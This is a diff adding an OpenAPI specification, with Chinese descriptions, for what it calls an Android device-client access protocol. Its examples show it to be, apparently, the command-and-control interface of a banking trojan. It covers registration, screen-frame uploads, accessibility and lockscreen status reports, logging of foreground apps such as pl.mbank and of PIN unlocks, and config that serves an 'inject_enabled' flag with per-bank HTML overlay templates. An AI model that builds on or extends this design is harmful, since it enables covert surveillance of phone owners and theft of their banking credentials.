@@ -1,0 +1,325 @@
+openapi: 3.1.0
+info:
+  title: 设备客户端接入协议 v1
+  version: 1.0.0
+  description: |
+    终端设备（Android 客户端）与服务端之间的接入协议。
+
+    约定：
+    - 鉴权：`X-Device-Id` + `X-Device-Token`（注册接口返回，长期有效，可轮换）
+    - 全部请求要求 `Content-Type` 明确；二进制帧接口使用 `image/jpeg` / `image/webp`
+    - 幂等：`POST /client/event` 与 `POST /client/frame` 要求客户端带 `X-Idempotency-Key`
+    - 时间一律 UTC ISO-8601（`2026-11-20T05:31:00Z`）
+    - 错误统一 `{ok:false, error:{code, message}}`
+servers:
+  - url: https://{host}
+    variables:
+      host: { default: api.example.com }
+
+paths:
+  /api/v1/client/register:
+    post:
+      summary: 注册设备（幂等）
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/RegisterRequest' }
+            examples:
+              first:
+                value:
+                  device_uid: "9f2c1e7ab34d5c60"
+                  model: "SM-G981V"
+                  os: "Android 13"
+                  app_version: "4.5"
+                  abi: "arm64-v8a"
+                  locale: "pl-PL"
+      responses:
+        '200':
+          description: 已注册（重复 device_uid 返回同一 device_id）
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/RegisterResponse' }
+              examples:
+                ok:
+                  value:
+                    ok: true
+                    data:
+                      device_id: "0b7f1a1c-9d2e-4c11-8f77-2f3a9d1e6b21"
+                      device_token: "dt_3f9c…（64 hex）"
+                      server_time: "2026-11-20T05:31:00Z"
+                      config_ttl: 300
+        '409':
+          description: device_uid 已绑定其它注册凭证
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/Error' }
+
+  /api/v1/client/online:
+    post:
+      summary: 在线心跳（刷新在线态与 last_seen）
+      security: [ { deviceToken: [] } ]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/OnlineRequest' }
+            examples:
+              beat:
+                value:
+                  battery: 87
+                  charging: true
+                  network: "wifi"
+                  screen_on: false
+                  app_version: "4.5"
+                  ts: "2026-11-20T05:31:00Z"
+      responses:
+        '204': { description: 已刷新（无响应体） }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+
+  /api/v1/client/state:
+    post:
+      summary: 状态上报（整包覆盖 state，字段级合并由服务端保证）
+      security: [ { deviceToken: [] } ]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/StateRequest' }
+            examples:
+              full:
+                value:
+                  state:
+                    accessibility: true
+                    installed_apps_count: 132
+                    app_list_hash: "c1f0…"
+                    lockscreen: "pin"
+                    tags: ["pl", "bank"]
+      responses:
+        '204': { description: 已保存 }
+        '422': { $ref: '#/components/responses/Invalid' }
+
+  /api/v1/client/frame:
+    post:
+      summary: 上报画面帧（二进制）
+      security: [ { deviceToken: [] } ]
+      parameters:
+        - in: header
+          name: X-Idempotency-Key
+          required: true
+          schema: { type: string, maxLength: 64 }
+        - in: header
+          name: X-Frame-Ts
+          required: false
+          schema: { type: string, format: date-time }
+      requestBody:
+        required: true
+        content:
+          image/jpeg:
+            schema: { type: string, contentMediaType: image/jpeg, maxLength: 3145728 }
+          image/webp:
+            schema: { type: string, contentMediaType: image/webp, maxLength: 2097152 }
+      responses:
+        '204': { description: 已存储 }
+        '413': { description: 帧过大（上限：jpeg 3MiB / webp 2MiB） }
+
+  /api/v1/client/event:
+    post:
+      summary: 事件批量上报（幂等，单批 ≤ 200 条）
+      security: [ { deviceToken: [] } ]
+      parameters:
+        - in: header
+          name: X-Idempotency-Key
+          required: true
+          schema: { type: string, maxLength: 64 }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/EventRequest' }
+            examples:
+              batch:
+                value:
+                  events:
+                    - event_uid: "evt_01HF7Q2"
+                      kind: "app_foreground"
+                      at: "2026-11-20T05:30:12Z"
+                      payload: { package: "pl.mbank" }
+                    - event_uid: "evt_01HF7Q3"
+                      kind: "screen_unlock"
+                      at: "2026-11-20T05:30:40Z"
+                      payload: { method: "pin" }
+      responses:
+        '202':
+          description: 已入队/已写入，返回去重结果
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  ok: { type: boolean, const: true }
+                  data:
+                    type: object
+                    properties:
+                      accepted: { type: integer }
+                      duplicated: { type: integer }
+
+  /api/v1/client/config:
+    get:
+      summary: 拉取配置（模板清单 + 开关 + TTL）
+      security: [ { deviceToken: [] } ]
+      parameters:
+        - in: query
+          name: etag
+          schema: { type: string }
+      responses:
+        '200':
+          description: 配置
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/ConfigResponse' }
+              examples:
+                payload:
+                  value:
+                    ok: true
+                    data:
+                      flags: { inject_enabled: true, keepalive_interval: 60 }
+                      templates:
+                        - package: "pl.mbank"
+                          kind: "page"
+                          version: 3
+                          url: "https://cdn.example.com/tpl/pl.mbank.html"
+                          sha256: "9c1f…"
+                      ttl: 300
+          headers:
+            ETag:
+              schema: { type: string }
+        '304':
+          description: 未修改（与请求 etag 相同）
+
+components:
+  securitySchemes:
+    deviceToken:
+      type: apiKey
+      in: header
+      name: X-Device-Token
+      description: 与 `X-Device-Id` 配对使用；由 `/client/register` 返回
+
+  responses:
+    Unauthorized:
+      description: 设备未授权
+      content:
+        application/json:
+          schema: { $ref: '#/components/schemas/Error' }
+          examples:
+            e: { value: { ok: false, error: { code: "device_unauthorized", message: "invalid device credentials" } } }
+    Invalid:
+      description: 参数不合法
+      content:
+        application/json:
+          schema: { $ref: '#/components/schemas/Error' }
+
+  schemas:
+    Error:
+      type: object
+      required: [ok, error]
+      properties:
+        ok: { type: boolean, const: false }
+        error:
+          type: object
+          required: [code, message]
+          properties:
+            code: { type: string, examples: ["device_unauthorized", "invalid_payload", "rate_limited"] }
+            message: { type: string }
+            request_id: { type: string }
+
+    RegisterRequest:
+      type: object
+      required: [device_uid, model, os, app_version]
+      properties:
+        device_uid:
+          type: string
+          minLength: 8
+          maxLength: 64
+          pattern: '^[A-Za-z0-9_-]+$'
+          description: 客户端生成的稳定标识（不可用 IMEI/序列号）
+        model: { type: string, maxLength: 64 }
+        os: { type: string, maxLength: 32 }
+        app_version: { type: string, maxLength: 16 }
+        abi: { type: string, maxLength: 16, examples: ["arm64-v8a"] }
+        locale: { type: string, maxLength: 16, examples: ["pl-PL"] }
+        apk_ref: { type: string, maxLength: 32, description: "可选：安装包批号，仅作关联，不参与鉴权" }
+
+    RegisterResponse:
+      type: object
+      required: [ok, data]
+      properties:
+        ok: { type: boolean, const: true }
+        data:
+          type: object
+          required: [device_id, device_token, server_time]
+          properties:
+            device_id: { type: string, format: uuid }
+            device_token: { type: string, description: "64 hex；仅在注册/轮换时返回一次" }
+            server_time: { type: string, format: date-time }
+            config_ttl: { type: integer, minimum: 60, maximum: 3600 }
+
+    OnlineRequest:
+      type: object
+      properties:
+        battery: { type: integer, minimum: 0, maximum: 100 }
+        charging: { type: boolean }
+        network: { type: string, enum: [wifi, mobile, ethernet, none] }
+        screen_on: { type: boolean }
+        app_version: { type: string, maxLength: 16 }
+        ts: { type: string, format: date-time }
+
+    StateRequest:
+      type: object
+      required: [state]
+      properties:
+        state:
+          type: object
+          additionalProperties: true
+          description: 非敏感状态；禁止放密码/令牌
+
+    EventItem:
+      type: object
+      required: [event_uid, kind, at]
+      properties:
+        event_uid: { type: string, maxLength: 64 }
+        kind: { type: string, maxLength: 48 }
+        at: { type: string, format: date-time }
+        payload: { type: object, additionalProperties: true }
+
+    EventRequest:
+      type: object
+      required: [events]
+      properties:
+        events:
+          type: array
+          minItems: 1
+          maxItems: 200
+          items: { $ref: '#/components/schemas/EventItem' }
+
+    ConfigResponse:
+      type: object
+      required: [ok, data]
+      properties:
+        ok: { type: boolean, const: true }
+        data:
+          type: object
+          properties:
+            flags: { type: object, additionalProperties: true }
+            templates:
+              type: array
+              items:
+                type: object
+                properties:
+                  package: { type: string }
+                  kind: { type: string, enum: [page, guide, resource] }
+                  version: { type: integer }
+                  url: { type: string, format: uri }
+                  sha256: { type: string }
+            ttl: { type: integer }
